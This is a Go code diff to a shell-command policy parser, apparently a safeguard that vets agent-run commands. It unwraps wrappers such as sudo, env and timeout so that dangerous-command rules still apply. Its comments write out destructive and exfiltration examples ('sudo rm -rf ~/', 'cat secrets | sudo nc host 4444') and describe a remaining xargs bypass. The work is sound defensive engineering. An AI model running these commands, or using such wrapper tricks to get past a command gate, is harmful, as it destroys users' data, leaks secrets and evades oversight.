@@ -1,6 +1,8 @@
 package shell
 
 import (
+	"strings"
+
 	"mvdan.cc/sh/v3/syntax"
 
 	"github.com/amplify-lab/damping/core/policy"
@@ -30,14 +32,135 @@ var knownAliases = map[string][]string{
 	"nuke": {"rm", "-rf"},
 }
 
-// factsFromCall turns a single simple command into Facts. In mvdan/sh,
-// CallExpr.Args[0] is the command word itself, not a separate field — Args[1:]
-// are the real arguments.
-func factsFromCall(c *syntax.CallExpr, raw string) (policy.Facts, bool) {
-	if len(c.Args) == 0 {
+// commandPrefix describes a wrapper program that runs *another* command
+// given as its own trailing arguments — "sudo rm -rf /" is an rm invocation,
+// not a sudo one. Every rule in core/policy dispatches on Facts.Command, so
+// until these were unwrapped, prefixing any dangerous command with any of
+// them silently bypassed the entire rule set: `sudo rm -rf ~/`, `env rm -rf
+// ~/`, `nohup rm -rf ~/` and friends were all evaluated as commands named
+// "sudo"/"env"/"nohup", which no matcher has ever heard of, and were
+// therefore allowed outright. Found by an adversarial review of the
+// 2026-07 agent-asset expansion; every shape below is now a permanent
+// regression scenario in features/dangerous_command.feature and this
+// package's own tests.
+//
+// valueFlags are that wrapper's own flags which consume the following
+// argument, so the value is never mistaken for the wrapped command name
+// (the same problem core/policy's dampingSubcommand solves for --config).
+// skipPositional is how many non-flag operands belong to the wrapper itself
+// before the real command begins — only `timeout`, whose first operand is a
+// duration ("timeout 5 rm -rf ~/"), needs this.
+//
+// Deliberately absent: `xargs`. Unwrapping it would surface `rm -rf` with no
+// path operands at all (they arrive on stdin at runtime), which no rule can
+// judge — `echo ~/ | xargs rm -rf` therefore remains a disclosed bypass,
+// needing a policy decision about stdin-sourced operands rather than a
+// parser change. See docs/threat-model.md §3.
+type commandPrefix struct {
+	valueFlags     map[string]bool
+	skipPositional int
+	// allowAssigns permits leading NAME=VALUE words (env's own syntax) to be
+	// skipped over while looking for the wrapped command name.
+	allowAssigns bool
+}
+
+var commandPrefixes = map[string]commandPrefix{
+	"sudo":    {valueFlags: map[string]bool{"-u": true, "-g": true, "-U": true, "-C": true, "-p": true, "-r": true, "-t": true, "-h": true}, allowAssigns: true},
+	"doas":    {valueFlags: map[string]bool{"-u": true, "-C": true}},
+	"env":     {valueFlags: map[string]bool{"-u": true, "--unset": true, "-C": true, "--chdir": true}, allowAssigns: true},
+	"command": {},
+	"exec":    {valueFlags: map[string]bool{"-a": true}},
+	"nohup":   {},
+	"setsid":  {},
+	"stdbuf":  {valueFlags: map[string]bool{"-i": true, "-o": true, "-e": true}},
+	"nice":    {valueFlags: map[string]bool{"-n": true}},
+	"ionice":  {valueFlags: map[string]bool{"-c": true, "-n": true, "-p": true}},
+	"time":    {},
+	"timeout": {valueFlags: map[string]bool{"-s": true, "--signal": true, "-k": true, "--kill-after": true}, skipPositional: 1},
+}
+
+// unwrapCommandPrefixes resolves "sudo -u root env FOO=1 rm -rf /" down to
+// the command that actually runs ("rm -rf /"), peeling one wrapper at a time
+// so stacked wrappers resolve too. A wrapper with nothing after it (a bare
+// "sudo", or "env FOO=1" with no command) is left exactly as it was — there
+// is no wrapped command to promote.
+func unwrapCommandPrefixes(words []string) []string {
+	// Bounded by the number of wrappers actually present; each iteration
+	// strictly shortens words, so this always terminates.
+	for len(words) > 0 {
+		p, ok := commandPrefixes[words[0]]
+		if !ok {
+			return words
+		}
+		rest, ok := wrappedCommandArgs(words[1:], p)
+		if !ok {
+			return words
+		}
+		words = rest
+	}
+	return words
+}
+
+// wrappedCommandArgs skips a wrapper's own flags, flag values, leading
+// NAME=VALUE assignments, and wrapper-owned positional operands, returning
+// the remaining words (the wrapped command and its arguments). It reports
+// false when nothing is left, i.e. there is no wrapped command at all.
+func wrappedCommandArgs(args []string, p commandPrefix) ([]string, bool) {
+	i := 0
+	for i < len(args) {
+		a := args[i]
+		switch {
+		case a == "--":
+			i++
+			continue
+		case p.valueFlags[a]:
+			i += 2 // the flag and its separate value
+			continue
+		case strings.HasPrefix(a, "-") && a != "-":
+			i++
+			continue
+		case p.allowAssigns && isAssignmentWord(a):
+			i++
+			continue
+		}
+		break
+	}
+	i += p.skipPositional
+	if i >= len(args) {
+		return nil, false
+	}
+	// A wrapped command name that didn't resolve to a literal must not be
+	// promoted into Facts.Command — leaving the wrapper name in place would
+	// hide it, so surface it as the dynamic-command placeholder the way
+	// factsFromCall already does for an unresolvable command word.
+	if args[i] == "" {
+		return nil, false
+	}
+	return args[i:], true
+}
+
+// isAssignmentWord reports whether a word is a NAME=VALUE environment
+// assignment (env's own syntax) rather than a command name. A leading "="
+// is not an assignment, and neither is a word whose name half is empty.
+func isAssignmentWord(a string) bool {
+	idx := strings.Index(a, "=")
+	return idx > 0
+}
+
+// factsFromWords turns a single simple command into Facts, given its words
+// already resolved to literals. In mvdan/sh, CallExpr.Args[0] is the command
+// word itself, not a separate field — words[1:] are the real arguments.
+//
+// The caller (parser.go's walkCmd) resolves and prefix-unwraps the words
+// itself, because it needs the same unwrapped argv to decide whether the
+// command will execute one of its own arguments as a shell script (see
+// embeddedShellScripts). unwrapCommandPrefixes is idempotent, so calling it
+// again here is harmless and keeps this function correct on its own terms.
+func factsFromWords(words []string, raw string) (policy.Facts, bool) {
+	if len(words) == 0 {
 		return policy.Facts{}, false
 	}
-	words := literalArgs(c.Args)
+	words = unwrapCommandPrefixes(words)
 
 	command := words[0]
 	if command == "" {
@@ -109,8 +232,16 @@ func collectPipelineCommands(cmd syntax.Command, cmds *[]string, domain *string)
 		if len(c.Args) == 0 {
 			return false
 		}
-		name, ok := staticWordValue(c.Args[0])
-		if !ok || name == "" {
+		// A pipeline stage's command name goes through the same wrapper
+		// unwrapping a lone command does, so "cat secrets | sudo nc host
+		// 4444" still presents "nc" as the pipeline's network sink rather
+		// than "sudo" — otherwise every pipeline-shape rule (curl|sh,
+		// base64|sh, secret exfiltration) is bypassed by one sudo.
+		name := ""
+		if words := unwrapCommandPrefixes(literalArgs(c.Args)); len(words) > 0 {
+			name = words[0]
+		}
+		if name == "" {
 			name = policy.DynamicCommandPlaceholder
 		} else if replacement, aliased := knownAliases[name]; aliased {
 			// A pipeline stage's command name is resolved through the same
